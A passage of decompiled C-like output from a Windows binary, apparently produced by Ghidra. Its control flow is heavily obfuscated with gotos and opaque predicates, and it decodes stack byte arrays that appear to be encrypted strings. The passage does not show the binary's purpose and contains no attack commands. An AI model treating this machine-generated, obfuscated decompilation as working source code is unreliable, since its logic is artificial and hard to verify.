            bVar13 = cVar2 + bVar7 + (cVar2 + 0x10U & bVar7) * -2 + 0xa0;
            uVar8 = uVar8 + abStack_c9[uVar8 + 1] + uVar4 + 1;
            uVar12 = uVar4;
            goto LAB_14004e522;
          }
          if (uVar12 + 0xb < uVar1) {
            bVar13 = ('\f' - (cVar2 + 0x7cU & bVar7)) * '\x02' + bVar7 + cVar2;
            uVar12 = uVar4;
            goto LAB_14004eb56;
          }
          uVar10 = uVar12 + 0xe;
          if (uVar10 < uVar1) {
            cVar14 = bVar7 + (cVar2 - 0x18U & bVar7) * -2 + -0x70;
            uVar10 = uVar1;
            uVar12 = uVar4;
            goto LAB_14004ea3b;
          }
          if (uVar12 + 0x1a < uVar1) {
            bVar13 = (cVar2 + bVar7 + (cVar2 + 4U & bVar7) * -2) - 0x18;
            uVar10 = uVar1;
            uVar12 = uVar12 + 0xb;
            goto LAB_14004e522;
          }
          uVar12 = uVar12 + 0x1e;
        }
        bVar13 = ('\x12' - (cVar2 - 6U & bVar7)) * '\x02' + bVar7 + cVar2;
        uVar10 = uVar4;
        uVar12 = uVar11;
        goto LAB_14004e535;
      }
      if (uVar10 < uVar12 + 0x41) {
        bVar13 = bVar7 + (cVar2 + 0xb6U & bVar7) * -2 + -0x44 + cVar2;
      }
      else {
        if (uVar10 == uVar12 + 1) {
          bVar13 = (cVar2 + bVar7 + (cVar2 - 0x24U & bVar7) * -2) - 0x28;
          uVar8 = uVar8 + abStack_c9[uVar8 + 1] + uVar12 + 1;
          goto LAB_14004e522;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = ('(' - (cVar2 + 0x48U & bVar7)) * '\x02' + bVar7 + cVar2;
          goto LAB_14004eb56;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = ('\x18' - (cVar2 - 8U & bVar7)) * '\x02' + bVar7 + cVar2;
          goto LAB_14004eb00;
        }
      }
      if (uVar12 + uVar10 == 4) {
        cVar14 = (cVar2 + 0x5cU & bVar7) * -2 + -0x28;
        goto LAB_14004ea3b;
      }
      uVar4 = uVar12 + 1;
      if (uVar4 < uVar10) {
        bVar13 = bVar7 + (cVar2 + 0x5eU & bVar7) * -2 + -0x34 + cVar2;
      }
      else {
        if (uVar10 == uVar4) {
          cVar14 = ('\"' - (cVar2 - 0x36U & bVar7)) * '\x02' + bVar7;
          goto LAB_14004eaba;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = cVar2 + bVar7 + (cVar2 + 0x36U & bVar7) * -2 + 0xbc;
          uVar12 = uVar12 + 1;
          goto LAB_14004e522;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = cVar2 + bVar7 + (cVar2 - 0x1aU & bVar7) * -2 + 0x9c;
          goto LAB_14004eb21;
        }
        if (uVar10 == uVar12 + 5) {
          cVar14 = ('\n' - (cVar2 + 0x52U & bVar7)) * '\x02' + bVar7;
          goto LAB_14004ea3b;
        }
      }
      if (3 < uVar10) {
        bVar13 = ((bVar7 - (cVar2 - 0x10U & bVar7)) + '0') * '\x02' + cVar2;
        goto LAB_14004eb00;
      }
      if (uVar4 < uVar10) {
        bVar13 = ('\x1c' - (cVar2 + 0x4cU & bVar7)) * '\x02' + bVar7 + cVar2;
      }
      else {
        if (uVar10 == uVar4) {
          bVar13 = cVar2 + bVar7 + (cVar2 + 0xb8U & bVar7) * -2 + 0xb0;
          uVar8 = uVar8 + abStack_c9[uVar8 + 1] + uVar12 + 1;
          goto LAB_14004e522;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = ('\x14' - (cVar2 + 0x24U & bVar7)) * '\x02' + bVar7 + cVar2;
          goto LAB_14004eb56;
        }
        if (uVar10 == uVar12 + 2) {
          bVar13 = ('\x04' - (cVar2 - 0x2cU & bVar7)) * '\x02' + bVar7 + cVar2;
LAB_14004eb00:
          abStack_c9[uVar8 + 1] =
               (';' - (cVar2 + 0xa6U & bVar7)) * '\x02' + cVar2 + 0xa6U + bVar13 + bVar7;
          uVar10 = uVar10 + uVar12;
LAB_14004eb21:
          uVar8 = uVar8 - bVar13;
          goto LAB_14004e522;
        }
        if (uVar10 == uVar12 + 5) {
          bVar13 = cVar2 + bVar7 + (cVar2 + 0x40U & bVar7) * -2 + 0x80;
          goto LAB_14004e522;
        }
      }
      if (3 < uVar12) {
        bVar13 = (bVar7 + (cVar2 + 0x84U & bVar7) * -2 + cVar2) * '\x02' - 0x30;
        goto LAB_14004eabd;
      }
      abStack_c9[uVar8 + 1] = bVar13;
      uVar8 = uVar8 + 1;
      goto LAB_14004e522;
    }
    abStack_a9[1] = 0x6e;
    abStack_a9[2] = 0x65;
    abStack_a9[3] = 100;
    abStack_a9[4] = 99;
    abStack_a9[5] = 0;
    abStack_a9[6] = 0;
    abStack_a9[7] = 0;
    abStack_a9[8] = 0;
    abStack_a9[9] = 0;
    abStack_a9[10] = 0;
    abStack_a9[0xb] = 0;
    abStack_a9[0xc] = 0;
    abStack_a9[0xd] = 0;
    abStack_a9[0xe] = 0;
    abStack_a9[0xf] = 0;
    abStack_a9[0x10] = 0;
    abStack_a9[0x11] = 0;
    abStack_a9[0x12] = 0;
    abStack_a9[0x13] = 0;
    abStack_a9[0x14] = 0;
    abStack_a9[0x15] = 0;
    abStack_a9[0x16] = 0;
    abStack_a9[0x17] = 0;
    abStack_a9[0x18] = 0;
    abStack_a9[0x19] = 0;
    abStack_a9[0x1a] = 0;
    abStack_a9[0x1b] = 0;
    abStack_a9[0x1c] = 0;
    abStack_a9[0x1d] = 0;
    abStack_a9[0x1e] = 0;
    bVar13 = local_118;
LAB_14004ec40:
    uVar11 = DAT_140a618c8;
    uVar4 = DAT_140a618d0;
LAB_14004ec50:
    uVar12 = 0;
    uVar10 = uVar4;
LAB_14004ec52:
    cVar2 = (char)uVar12;
    if (uVar12 < 0x1e) {
      bVar7 = abStack_a9[uVar12 + 1];
LAB_14004ec65:
      if (uVar11 <= uVar12) {
        if (uVar11 < uVar10 + 1) {
          bVar13 = cVar2 + 0x91U + (cVar2 + 0x91U & bVar7) * -2 + '\t' + bVar7;
        }
        else {
          if (uVar11 == uVar10 + 1) {
            bVar13 = bVar7 + cVar2 + 0xb3U + (cVar2 + 0xb3U & bVar7) * -2 + 0x1b;
            uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar10 + 1;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = bVar7 + (cVar2 - 0x2bU) + (cVar2 - 0x2bU & bVar7) * -2 + 0x2d;
LAB_14004f60c:
            bVar5 = (char)uVar12 + 0x2c;
            abStack_a9[uVar12 + 1] = bVar5 + (bVar5 & bVar7) * -2 + -0x34 + bVar7;
            uVar11 = uVar11 + 1;
            lVar9 = uVar12 + (-1 - uVar11);
            uVar12 = lVar9 + abStack_a9[lVar9 + 1] + uVar10 + 1;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 3) {
            bVar13 = bVar7 + cVar2 + 0x5dU + (cVar2 + 0x5dU & bVar7) * -2 + 0x75;
LAB_14004f5be:
            abStack_a9[uVar12 + 1] =
                 bVar7 + (bVar7 & cVar2 + 0x79U) * -2 + -0x4f + bVar13 + cVar2 + 0x79U;
LAB_14004f5db:
            uVar11 = uVar11 + uVar10;
LAB_14004f5de:
            uVar12 = uVar12 - bVar13;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = ('\x03' - (cVar2 + 0x7fU & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 5) {
            bVar13 = ('\x1d' - (cVar2 + 0xa1U & bVar7)) * '\x02' + cVar2 + bVar7;
            uVar10 = uVar10 + 1;
            goto LAB_14004ec52;
          }
        }
LAB_14004ecd0:
        if (uVar12 < uVar10) goto LAB_14004f6a1;
        if (uVar10 + 0x10 <= uVar11) {
          if (uVar11 == uVar10 + 1) {
            bVar13 = (bVar7 + cVar2 + (cVar2 + 7U & bVar7) * -2) - 0x2a;
            goto LAB_14004f53a;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = ('\x05' - (cVar2 + 0x29U & bVar7)) * '\x02' + cVar2 + bVar7;
            uVar10 = uVar10 + 1;
          }
          else {
            if (uVar11 != uVar10 + 3) {
              if (uVar11 != uVar10 + 5) {
                if (uVar11 != uVar10 + 7) goto LAB_14004ed40;
                bVar13 = cVar2 - 0x2d;
                cVar14 = '\a';
                goto LAB_14004f490;
              }
              bVar13 = (bVar7 + cVar2 + (cVar2 + 0xb1U & bVar7) * -2) - 0x26;
              goto LAB_14004f5de;
            }
            bVar13 = ('\x1f' - (cVar2 + 0x4bU & bVar7)) * '\x02' + cVar2 + bVar7;
          }
          goto LAB_14004ec52;
        }
        bVar13 = cVar2 + (cVar2 - 0x1bU & bVar7) * -2 + -0x5e + bVar7;
LAB_14004ed40:
        while( true ) {
          uVar4 = uVar10;
          if (uVar10 + uVar11 <= uVar12) break;
          while( true ) {
            do {
              uVar10 = uVar4;
              if (uVar11 == uVar10 + 0x42) {
                bVar13 = ('\x16' - (cVar2 + 0x4eU & bVar7)) * '\x02' + cVar2 + bVar7;
                goto LAB_14004f53a;
              }
              if (uVar11 == uVar10 + 0x80) {
                bVar13 = ('0' - (cVar2 + 0x70U & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar10 = uVar10 + 1;
                goto LAB_14004ec52;
              }
              if (uVar11 == uVar10 + 10) {
                bVar13 = bVar7 + cVar2 + (cVar2 + 0x92U & bVar7) * -2 + 0x94;
                goto LAB_14004ec52;
              }
              if (uVar11 == uVar10 + 0x20) {
                bVar13 = (bVar7 + cVar2 + (cVar2 + 0xb4U & bVar7) * -2) - 0x38;
                goto LAB_14004f5be;
              }
              if (uVar11 == uVar10 + 0x40) {
                bVar13 = (bVar7 + cVar2 + (cVar2 - 0x2aU & bVar7) * -2) - 4;
                goto LAB_14004f5db;
              }
              uVar8 = uVar10 + 6;
              if (uVar11 == uVar8) {
                bVar13 = ('\x18' - (cVar2 - 8U & bVar7)) * '\x02' + cVar2 + bVar7;
                goto LAB_14004f5de;
              }
              if (uVar11 == uVar10 + 9) {
                bVar13 = cVar2 + 0x1a;
                cVar14 = '2';
                goto LAB_14004f490;
              }
              if (uVar11 == uVar10 + 0x10) {
                bVar13 = bVar7 + cVar2 + (cVar2 + 0x3cU & bVar7) * -2 + 0x98;
                goto LAB_14004f60c;
              }
              if (uVar11 == uVar10 + 3) {
                bVar13 = (bVar7 + cVar2 + (cVar2 + 0x5eU & bVar7) * -2) - 0x34;
                uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar10 + 1;
                goto LAB_14004ec52;
              }
              uVar4 = uVar10;
            } while (uVar11 == uVar10 + 5);
            uVar4 = uVar10 + 0xe;
            if (uVar8 < uVar10 + 0x68) {
              bVar13 = (bVar7 + cVar2 + (cVar2 + 0x33U & bVar7) * -2) - 0x32;
              goto LAB_14004ec40;
            }
            uVar11 = uVar8;
            if (uVar8 < uVar10 + 0xf) {
              bVar13 = ('\x01' - (cVar2 + 0x55U & bVar7)) * '\x02' + cVar2 + bVar7;
              goto LAB_14004ec50;
            }
            if (uVar8 < uVar10 + 0x11) {
              bVar13 = ('\x1b' - (cVar2 + 0x77U & bVar7)) * '\x02' + cVar2 + bVar7;
              uVar10 = uVar4;
              goto LAB_14004ec65;
            }
            if (uVar8 < uVar10 + 0x6f) {
              bVar13 = ('5' - (cVar2 + 0x99U & bVar7)) * '\x02' + cVar2 + bVar7;
              uVar10 = uVar4;
              goto LAB_14004ecd0;
            }
            if (uVar8 < uVar10 + 0x4f) break;
            if (uVar8 < uVar10 + 0x38) {
              cVar14 = cVar2 + (cVar2 - 0x23U & bVar7) * -2 + -0x2e;
              uVar10 = uVar4;
              goto LAB_14004f100;
            }
            if (uVar8 < uVar10 + 0x3f6) {
              cVar14 = ('\x03' - (cVar2 - 1U & bVar7)) * '\x02' + cVar2;
              uVar10 = uVar4;
              goto LAB_14004f0c6;
            }
            if (uVar8 < uVar10 + 0x100e) {
              bVar13 = cVar2 + 0x21;
              cVar14 = '\x1d';
              uVar10 = uVar4;
              goto LAB_14004f086;
            }
            if (uVar8 < uVar10 + 0x88) {
              bVar13 = ('7' - (cVar2 + 0x43U & bVar7)) * '\x02' + cVar2 + bVar7;
              uVar10 = uVar4;
              goto LAB_14004f06e;
            }
            if (uVar10 + 0x72 <= uVar8) {
              uVar11 = uVar10 + 0x8e;
              uVar4 = uVar10 + 0x28e;
              if (uVar10 + 0x676 < uVar11) {
                bVar13 = ('8' - (cVar2 + 0x18U & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar4 + 1;
                uVar10 = uVar4;
                goto LAB_14004ec52;
              }
              if (uVar10 + 0x2ae < uVar11) {
                bVar13 = bVar7 + cVar2 + (cVar2 + 0x3aU & bVar7) * -2 + 0xa4;
                uVar10 = uVar4;
                goto LAB_14004f60c;
              }
              if (uVar10 + 0x2ce < uVar11) {
                bVar13 = (bVar7 + cVar2 + (cVar2 + 0x5cU & bVar7) * -2) - 0x28;
                uVar10 = uVar4;
                goto LAB_14004f49f;
              }
              if (uVar10 + 0x2f2 < uVar11) {
                bVar13 = ('\x06' - (cVar2 + 0x7eU & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar10 = uVar4;
                goto LAB_14004f5de;
              }
              if (uVar10 + 0x297 < uVar11) {
                bVar13 = (' ' - (cVar2 + 0xa0U & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar10 = uVar4;
                goto LAB_14004f5db;
              }
              if (uVar10 + 0x29e < uVar11) {
                bVar13 = (':' - (cVar2 - 0x3eU & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar10 = uVar4;
                goto LAB_14004f5be;
              }
              if (uVar10 + 0x2b6 < uVar11) {
                bVar13 = bVar7 + cVar2 + (cVar2 - 0x1cU & bVar7) * -2 + 0xa8;
                uVar10 = uVar4;
                goto LAB_14004ec52;
              }
              if (uVar10 + 0x293 < uVar11) {
                bVar13 = (bVar7 + cVar2 + (cVar2 + 6U & bVar7) * -2) - 0x24;
                uVar10 = uVar10 + 0x28f;
                goto LAB_14004ec52;
              }
              if (uVar10 + 0x296 < uVar11) {
                bVar13 = ('\b' - (cVar2 + 0x28U & bVar7)) * '\x02' + cVar2 + bVar7;
                uVar10 = uVar4;
                goto LAB_14004f53a;
              }
              if (uVar11 <= uVar10 + 0x298) {
                uVar11 = uVar10 + 0x29e;
                uVar4 = uVar10 + 0x2a0;
              }
            }
          }
          bVar13 = cVar2 + (cVar2 + 0xbbU & bVar7) * -2 + -0x62 + bVar7;
          uVar10 = uVar4;
        }
        if (uVar11 < uVar10 + 3) {
          cVar14 = cVar2 + (cVar2 + 0x91U & bVar7) * -2 + -0x66;
LAB_14004f100:
          bVar13 = cVar14 + bVar7;
        }
        else {
          if (uVar11 == uVar10 + 1) {
            bVar13 = ('\"' - (cVar2 - 0x36U & bVar7)) * '\x02' + cVar2 + bVar7;
            uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar10 + 1;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = (bVar7 + cVar2 + (cVar2 + 0x30U & bVar7) * -2) - 0x20;
            goto LAB_14004f5de;
          }
          if (uVar11 == uVar10 + 5) {
            bVar13 = ('\n' - (cVar2 + 0x52U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004f5db;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = ('$' - (cVar2 + 0x74U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004f5be;
          }
          if (uVar11 == uVar10 + 4) {
            bVar13 = ('>' - (cVar2 + 0x96U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004ec52;
          }
        }
        if (uVar10 + uVar11 == 0x20) {
          bVar13 = (cVar2 + (cVar2 + 10U & bVar7) * -2) - 0x3c;
LAB_14004f49f:
          bVar5 = bVar7 + (bVar7 & cVar2 + 0x9bU) * -2 + -0x3d + cVar2 + 0x9bU;
          abStack_a9[uVar12 + 1] = bVar5;
          uVar12 = uVar12 - ((ulonglong)bVar5 + uVar10 + 1);
          uVar10 = uVar10 + 1;
          goto LAB_14004f60c;
        }
        if (uVar10 + 0x28 < uVar11) {
          cVar14 = cVar2 + (cVar2 + 0x8dU & bVar7) * -2 + -0x4e;
LAB_14004f0c6:
          bVar13 = cVar14 + bVar7;
        }
        else {
          if (uVar11 == uVar10 + 1) {
            bVar13 = (bVar7 + cVar2 + (cVar2 + 0xafU & bVar7) * -2) - 0x1a;
            goto LAB_14004f53a;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = ('\'' - (cVar2 - 0xdU & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 5) {
            bVar13 = bVar7 + cVar2 + (cVar2 + 0x37U & bVar7) * -2 + 0xb6;
            goto LAB_14004f5db;
          }
          if (uVar11 == uVar10 + 3) {
            bVar13 = cVar2 + 0x7b;
            cVar14 = '\x0f';
LAB_14004f490:
            bVar13 = (cVar14 - (bVar13 & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004f49f;
          }
          if (uVar11 == uVar10 + 4) {
            bVar13 = bVar7 + cVar2 + (cVar2 + 0xbfU & bVar7) * -2 + 0x86;
            uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar10 + 1;
            goto LAB_14004ec52;
          }
        }
        if (4 < uVar11) {
          bVar13 = bVar7 * '\x02' + (cVar2 - 0x18U & bVar7) * -2 + -0x70 + cVar2;
          goto LAB_14004f5be;
        }
        if (uVar10 + 6 < uVar11) {
          bVar13 = cVar2 + 0x72;
          cVar14 = '*';
LAB_14004f086:
          bVar13 = (cVar14 - (bVar13 & bVar7)) * '\x02' + cVar2 + bVar7;
        }
        else {
          if (uVar11 == uVar10 + 1) {
            bVar13 = bVar7 + cVar2 + (cVar2 + 0x94U & bVar7) * -2 + 0x88;
            uVar12 = uVar12 + abStack_a9[uVar12 + 1] + uVar10 + 1;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 2) {
            bVar13 = bVar7 + cVar2 + (cVar2 + 0xb6U & bVar7) * -2 + 0xbc;
            goto LAB_14004f60c;
          }
          if (uVar11 == uVar10 + 7) {
            bVar13 = (bVar7 + cVar2 + (cVar2 + 0x60U & bVar7) * -2) - 0x40;
            goto LAB_14004ec52;
          }
          if (uVar11 == uVar10 + 6) {
            bVar13 = ('\x14' - (cVar2 + 0xa4U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004f53a;
          }
        }
        if (uVar10 < 100) {
LAB_14004f06e:
          abStack_a9[uVar12 + 1] = bVar13;
          uVar12 = uVar12 + 1;
          goto LAB_14004ec52;
        }
        bVar13 = (cVar2 + (cVar2 - 0x3aU & bVar7) * -2 + bVar7) * '\x02' + 0xb8;
LAB_14004f53a:
        abStack_a9[uVar12 + 1] = bVar7 + (bVar7 & cVar2 + 0x57U) * -2 + -0x61 + cVar2 + 0x57U;
        uVar10 = uVar10 + 1;
        goto LAB_14004ec52;
      }
    }
LAB_14004f6a1:
    in_stack_0097ac36 = 0;
LAB_14004f6a3:
    cVar2 = FUN_1400250d0(local_40,local_60);
    in_stack_007841bd = in_stack_0097ac36;
    if (cVar2 == '\0') {
      abStack_e9[1] = 0xdc;
      abStack_e9[2] = 0xad;
      abStack_e9[3] = 0xaa;
      abStack_e9[4] = 0xab;
      abStack_e9[5] = 0;
      abStack_e9[6] = 0;
      abStack_e9[7] = 0;
      abStack_e9[8] = 0;
      abStack_e9[9] = 0;
      abStack_e9[10] = 0;
      abStack_e9[0xb] = 0;
      abStack_e9[0xc] = 0;
      abStack_e9[0xd] = 0;
      abStack_e9[0xe] = 0;
      abStack_e9[0xf] = 0;
      abStack_e9[0x10] = 0;
      abStack_e9[0x11] = 0;
      abStack_e9[0x12] = 0;
      abStack_e9[0x13] = 0;
      abStack_e9[0x14] = 0;
      abStack_e9[0x15] = 0;
      abStack_e9[0x16] = 0;
      abStack_e9[0x17] = 0;
      abStack_e9[0x18] = 0;
      abStack_e9[0x19] = 0;
      abStack_e9[0x1a] = 0;
      abStack_e9[0x1b] = 0;
      abStack_e9[0x1c] = 0;
      abStack_e9[0x1d] = 0;
LAB_14004f6f0:
      uVar4 = DAT_140a618c8;
      uVar11 = DAT_140a618d0;
LAB_14004f700:
      uVar12 = 0;
      uVar10 = uVar11;
LAB_14004f702:
      if (0x1c < uVar12) {
        in_stack_007841bd = abStack_e9[1];
        goto LAB_140050c89;
      }
      bVar13 = abStack_e9[uVar12 + 1];
      bVar7 = (byte)uVar12;
LAB_14004f716:
      if (uVar12 < uVar4) {
        in_stack_007841bd = in_stack_00e0e1aa;
        goto LAB_140050c89;
      }
      if (uVar10 + 1 <= uVar4) {
        if (uVar4 != uVar10 + 1) {
          if (uVar4 == uVar10 + 2) {
            local_118 = ('9' - (bVar7 + 0x82 & bVar13)) * '\x02' + bVar7 + 0x82 + bVar13;
            goto LAB_1400500cd;
          }
          if (uVar4 == uVar10 + 2) {
            bVar5 = bVar7 + 0xb6;
            bVar6 = bVar13 & bVar5;
            cVar2 = '\x03';
            goto LAB_140050080;
          }
          if (uVar4 != uVar10 + 3) {
            if (uVar4 != uVar10 + 5) goto LAB_14004f781;
            local_118 = ('6' - (bVar7 - 0x12 & bVar13)) * '\x02' + bVar13 + bVar7;
            goto LAB_14005001c;
          }
          local_118 = (bVar7 - 0x16) + bVar13 + (bVar13 & bVar7 - 0x16) * -2 + 0x9a;
          goto LAB_140050057;
        }
        local_118 = (bVar13 + bVar7 + 0x4e + (bVar7 + 0x4e & bVar13) * -2) - 0x22;
        uVar12 = uVar12 + abStack_e9[uVar12 + 1] + uVar10 + 1;
        goto LAB_14004f702;
      }
      local_118 = bVar13 + (bVar13 & bVar7 + 0x1a) * -2 + 'J' + bVar7 + 0x1a;
LAB_14004f781:
      if (uVar12 < uVar10) {
        in_stack_007841bd = in_stack_014fac90;
        goto LAB_140050c89;
      }
      bVar5 = bVar7;
      if (uVar4 < uVar10 + 0x40) {
        local_118 = ('\x1a' - (bVar7 + 0x22 & bVar13)) * '\x02' + bVar13 + bVar7;
      }
      else {
        if (uVar4 == uVar10 + 1) {
          local_118 = bVar13 + (bVar7 + 0x56 & bVar13) * -2 + -4 + bVar7;
          goto LAB_14005001c;
        }
        if (uVar4 == uVar10 + 3) {
          bVar5 = bVar7 + 0x26;
          cVar2 = '\x0e';
LAB_14004ffd8:
          local_118 = (cVar2 - (bVar5 & bVar13)) * '\x02' + bVar13 + bVar7;
          uVar4 = uVar4 + uVar10;
          goto LAB_140050057;
        }
        if (uVar4 == uVar10 + 2) {
          local_118 = (bVar7 + bVar13 + (bVar7 + 0x5a & bVar13) * -2) - 0x1c;
          goto LAB_140050057;
        }
        if (uVar4 == uVar10 + 4) {
          cVar2 = bVar13 + (bVar7 + 0x8e & bVar13) * -2 + -0x54;
          goto LAB_140050089;
        }
      }
      while (uVar12 < uVar10 + uVar4) {
        while( true ) {
          if (uVar4 == uVar10 + 0x41) {
            local_118 = bVar13 + (bVar7 + 0x2c & bVar13) * -2 + -8 + bVar7;
            goto LAB_14005001c;
          }
          if (uVar4 == uVar10 + 0x5a) {
            local_118 = (bVar7 + bVar13 + (bVar7 + 0x60 & bVar13) * -2) - 0x40;
            uVar10 = uVar10 + 1;
            goto LAB_14004f702;
          }
          if (uVar4 == uVar10 + 10) {
            local_118 = bVar7 + bVar13 + (bVar7 + 0x94 & bVar13) * -2 + 0x88;
            goto LAB_14004f702;
          }
          if (uVar4 == uVar10 + 0x10) {
            local_118 = ('(' - (bVar7 - 0x38 & bVar13)) * '\x02' + bVar13 + bVar7;
            goto LAB_14004ff5b;
          }
          if (uVar4 == uVar10 + 0x1000) {
            bVar5 = bVar7 - 4;
            cVar2 = '\f';
            goto LAB_14004ffd8;
          }
          if (uVar4 == uVar10 + 0x61) {
            local_118 = (bVar7 + bVar13 + (bVar7 + 0x30 & bVar13) * -2) - 0x20;
            goto LAB_140050057;
          }
          if (uVar4 == uVar10 + 0x7a) {
            cVar2 = bVar13 + (bVar7 + 100 & bVar13) * -2 + -0x58;
            goto LAB_140050089;
          }
          if (uVar4 == uVar10 + 8) {
            local_118 = ('8' - (bVar7 + 0x98 & bVar13)) * '\x02' + bVar13 + bVar7;
            goto LAB_1400500cd;
          }
          if (uVar4 == uVar10 + 9) {
            local_118 = ('\x1c' - (bVar7 - 0x34 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar12 = uVar12 + abStack_e9[uVar12 + 1] + uVar10 + 1;
            goto LAB_14004f702;
          }
          uVar4 = uVar10 + 6;
          uVar11 = uVar10 + 0x406;
          if (uVar4 < uVar10 + 0x40e) {
            local_118 = ('\x16' - (bVar7 + 0x4e & bVar13)) * '\x02' + bVar7 + bVar13;
            goto LAB_14004f6f0;
          }
          if (uVar4 < uVar10 + 0x40f) {
            local_118 = (bVar13 + bVar7 + (bVar7 + 0x82 & bVar13) * -2) - 0xc;
            goto LAB_14004f700;
          }
          if (uVar4 < uVar10 + 0x7ee) {
            local_118 = bVar13 + (bVar7 + 0xb6 & bVar13) * -2 + -0x44 + bVar7;
            uVar10 = uVar11;
            goto LAB_14004f716;
          }
          if (uVar4 < uVar10 + 0x806) {
            local_118 = bVar13 + (bVar7 - 0x16 & bVar13) * -2 + -0x7c + bVar7;
            uVar10 = uVar11;
            goto LAB_14004f781;
          }
          if (uVar4 < uVar10 + 0x1406) break;
          if (uVar4 < uVar10 + 0x40b) {
            bVar6 = bVar7 + 0x52;
            cVar2 = '\n';
            uVar10 = uVar11;
            goto LAB_14004fbad;
          }
          if (uVar4 < uVar10 + 0x40c) {
            cVar2 = bVar13 + (bVar7 + 0x86 & bVar13) * -2 + -0x24;
            uVar10 = uVar11;
            goto LAB_14004fb60;
          }
          if (uVar4 < uVar10 + 0x486) {
            local_118 = bVar13 + (bVar7 + 0xba & bVar13) * -2 + -0x5c + bVar7;
            uVar10 = uVar11;
            goto LAB_14004fb27;
          }
          if (uVar4 < uVar10 + 0x606) {
            local_118 = ('6' - (bVar7 - 0x12 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar10 = uVar11;
            goto LAB_14004fb03;
          }
          uVar11 = uVar10 + 0x46a;
          uVar8 = uVar10 + 0x46d;
          uVar4 = uVar11;
          if (uVar10 + 0x4ed < uVar11) {
            local_118 = ('0' - (bVar7 + 0x70 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar12 = uVar12 + abStack_e9[uVar12 + 1] + uVar8 + 1;
            uVar10 = uVar8;
            goto LAB_14004f702;
          }
          if (uVar10 + 0x66d < uVar11) {
            local_118 = ('\x14' - (bVar7 + 0xa4 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar10 = uVar8;
            goto LAB_1400500cd;
          }
          if (uVar10 + 0x46f < uVar11) {
            cVar2 = bVar13 + (bVar7 - 0x28 & bVar13) * -2 + -0x10;
            uVar10 = uVar8;
            goto LAB_140050089;
          }
          if (uVar10 + 0x470 < uVar11) {
            local_118 = bVar7 + bVar13 + (bVar7 + 0xc & bVar13) * -2 + 0xb8;
            uVar10 = uVar8;
            goto LAB_140050057;
          }
          if (uVar10 + 0x471 < uVar11) {
            local_118 = bVar7 + bVar13 + (bVar7 + 0x40 & bVar13) * -2 + 0x80;
            uVar4 = uVar11 + uVar8;
            uVar10 = uVar8;
            goto LAB_140050057;
          }
          if (uVar10 + 0x4af < uVar11) {
            local_118 = ('$' - (bVar7 + 0x74 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar10 = uVar8;
            goto LAB_14004ff5b;
          }
          uVar4 = uVar10 + 0x4d1;
          if (uVar4 < uVar11) {
            local_118 = ('\b' - (bVar7 + 0xa8 & bVar13)) * '\x02' + bVar13 + bVar7;
            uVar4 = uVar11;
            uVar10 = uVar8;
            goto LAB_14004f702;
          }
          if (uVar10 + 0x497 < uVar11) {
            local_118 = (bVar7 + bVar13 + (bVar7 - 0x24 & bVar13) * -2) - 0x28;
            uVar4 = uVar11;
            uVar10 = uVar10 + 0x46e;
            goto LAB_14004f702;
          }
          if (uVar10 + 0x46e < uVar11) {
            local_118 = bVar13 + (bVar7 + 0x10 & bVar13) * -2 + -0x60 + bVar7;
            uVar4 = uVar11;
            uVar10 = uVar8;
            goto LAB_14005001c;
          }
          uVar10 = uVar10 + 0x4f9;
        }
        local_118 = ('&' - (bVar7 + 0x1e & bVar13)) * '\x02' + bVar13 + bVar7;
        uVar10 = uVar11;
      }
      if (uVar4 < uVar10 + 10) {
        bVar6 = bVar7 + 0x1a;
        cVar2 = '2';
LAB_14004fbad:
        local_118 = (cVar2 - (bVar6 & bVar13)) * '\x02' + bVar13 + bVar7;
LAB_14004fbb9:
        if (uVar10 + uVar4 == 0x200) {
          cVar2 = ('4' - (bVar7 - 0x3c & bVar13)) * '\x02';
LAB_140050089:
          local_118 = cVar2 + bVar5;
          bVar7 = (bVar7 - 0x22) + (bVar7 - 0x22 & bVar13) * -2 + -0x12 + bVar13;
          abStack_e9[uVar12 + 1] = bVar7;
          uVar12 = uVar12 - ((ulonglong)bVar7 + uVar10 + 1);
          uVar10 = uVar10 + 1;
LAB_1400500cd:
          bVar7 = (char)uVar12 - 8;
          abStack_e9[uVar12 + 1] = ('\x1c' - (bVar7 & bVar13)) * '\x02' + bVar7 + bVar13;
          lVar9 = uVar12 + (-1 - (uVar4 + 1));
          uVar12 = lVar9 + abStack_e9[lVar9 + 1] + uVar10 + 1;
          uVar4 = uVar4 + 1;
          goto LAB_14004f702;
        }
        if (uVar10 + 5 < uVar4) {
